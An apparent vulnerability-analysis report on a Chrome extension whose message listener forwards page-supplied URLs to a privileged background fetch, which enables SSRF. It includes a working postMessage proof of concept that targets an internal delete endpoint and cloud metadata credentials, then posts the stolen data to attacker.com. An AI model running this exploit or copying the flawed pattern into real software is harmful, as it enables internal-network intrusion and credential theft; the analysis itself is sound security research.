# CoCo Analysis: lidodaknbhbodjmemaoabcecocanlego

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 1

---

## Sink: cs_window_eventListener_message → fetch_resource_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/lidodaknbhbodjmemaoabcecocanlego/opgen_generated_files/cs_0.js
Line 471: window.addEventListener('message', (event) => {
Line 473: if(!event.data || !event.data.type)
Line 482: var request = event.data.request;

$FilePath$/home/teofanescu/cwsCoCo/extensions_local/lidodaknbhbodjmemaoabcecocanlego/opgen_generated_files/bg.js
Line 1013: if(request.url) {

**Code:**

```javascript
// Content script (cs_0.js) - Entry point
window.addEventListener('message', (event) => { // ← attacker can postMessage
    console.log('[CONTENT.js]', 'Message received...', event);
    if(!event.data || !event.data.type) {
        return;
    }
    if(event.data.type === 'NativeHttpRequest') {
        var request = event.data.request; // ← attacker-controlled
        // Forward the message to the background script
        chrome.runtime.sendMessage(request, response => { // ← sends attacker data to background
            if(chrome.runtime.lastError) {
                console.error('CH-EXT', 'onMessage', 'Error sending message to background script:', chrome.runtime.lastError);
            } else if(response.error) {
                console.error('CH-EXT', 'onMessage', 'Error fetching data:', response.error);
                event.source.postMessage({type: "NativeHttpResponse", request: request, error: response.error}, "*");
            } else {
                console.log('CH-EXT', 'onMessage', 'Received data from background script:', response);
                event.source.postMessage({type: "NativeHttpResponse", request: request, data: response}, "*");
            }
        });
    }
})

// Background script (bg.js) - Message handler
chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
  console.log('CH-EXT', 'listener', 'Message received from client:', request);
  if(request.url) { // ← attacker-controlled URL
    const timeout = request.timeout * 1000; // ← attacker-controlled timeout

    const controller = new AbortController();
    const signal = controller.signal;
    const timer = setTimeout(() => controller.abort(), timeout);

    var headers = {};
    headers['Content-Type'] = 'application/xml';
    if(request.printer.driver=="epos") {
      headers['If-Modified-Since'] = 'Thu, 01 Jan 1970 00:00:00 GMT';
      headers['SOAPAction'] = '""';
    }

    fetch(request.url, { // ← SSRF: fetch to attacker-controlled URL with extension privileges
      method: request.method, // ← attacker-controlled method
      headers: headers,
      body: request.body, // ← attacker-controlled body
      signal
    })
    .then(response => response.text())
    .then(text => {
      sendResponse(text) // ← response sent back to attacker
    }).catch((error) => {
      sendResponse({ error: error.message });
    }).finally(() => clearTimeout(timer));

    return true; // Keep channel open for async response
  }
});
```

**Classification:** TRUE POSITIVE

**Attack Vector:** window.postMessage

**Attack:**

```javascript
// Malicious webpage can exploit this vulnerability
// Note: Extension content script runs on whitelisted domains in manifest:
// https://localhost/*, https://test.localismart.it/*, https://www.localismart.it/*, etc.

// But per methodology, we IGNORE manifest restrictions on content_scripts matches.
// If window.addEventListener("message") exists, assume ANY attacker on ANY matched domain can exploit it.

// On any of the whitelisted domains, attacker executes:
window.postMessage({
    type: 'NativeHttpRequest',
    request: {
        url: 'http://internal-server/admin/delete-all', // SSRF to internal network
        method: 'POST',
        body: 'malicious=payload',
        timeout: 10,
        printer: {driver: 'epos'}
    }
}, '*');

// Alternative attack - exfiltrate data from internal network:
window.postMessage({
    type: 'NativeHttpRequest',
    request: {
        url: 'http://169.254.169.254/latest/meta-data/iam/security-credentials/', // AWS metadata
        method: 'GET',
        body: '',
        timeout: 10,
        printer: {driver: 'other'}
    }
}, '*');

// Extension fetches the URL with privileged access and returns response to attacker
window.addEventListener('message', (event) => {
    if(event.data.type === 'NativeHttpResponse') {
        console.log('Stolen data:', event.data.data); // ← attacker receives internal data
        // Exfiltrate to attacker server
        fetch('https://attacker.com/collect', {
            method: 'POST',
            body: JSON.stringify(event.data.data)
        });
    }
});
```

**Impact:** Server-Side Request Forgery (SSRF) with privileged cross-origin requests. Attacker can make the extension perform arbitrary HTTP requests to any URL (including internal networks, cloud metadata services, localhost) with full extension privileges, bypassing CORS restrictions. The extension also returns responses back to the attacker, enabling data exfiltration from internal networks and services that would otherwise be inaccessible from the web.
